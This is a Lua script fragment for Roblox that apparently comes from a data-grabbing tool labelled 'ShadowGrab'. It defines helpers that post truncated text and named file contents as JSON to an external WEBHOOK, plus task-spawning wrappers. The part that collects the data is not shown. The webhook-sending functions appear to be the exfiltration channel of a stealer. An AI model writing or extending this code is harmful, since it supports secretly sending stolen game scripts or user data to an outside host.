-- safe HttpPost (uses HttpService JSON + http POST)
local HS = game:GetService("HttpService")

local function HttpPost(url, body)
    local ok, err = pcall(function()
        HS:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
    end)
    return ok
end

local function JSON(t)
    local ok, res = pcall(function() return HS:JSONEncode(t) end)
    if ok then return res end
    return "{}"
end

local function Truncate(s, n)
    s = tostring(s or "")
    if #s <= n then return s end
    return s:sub(1,n) .. "..."
end

local function Send(text, name)
    HttpPost(WEBHOOK, JSON({content = (name and ("📄 **"..name.."**\n```\n") or "") .. Truncate(text, 1800) .. "\n```"}))
end

local function SendEmbed(title, fields)
    local e = {title=title, color=0x9b59b6, fields=fields or {}, footer={text="ShadowGrab"}}
    HttpPost(WEBHOOK, JSON({embeds={e}}))
end

-- safe task wrapper
local function taskSpawn(fn)
    if task and task.spawn then
        task.spawn(fn)
    elseif coroutine then
        coroutine.wrap(fn)()
    else
        pcall(fn)
    end
end

local function taskWait(s)
    if task and task.wait then task.wait(s)
    elseif wait then wait(s)
    end
end

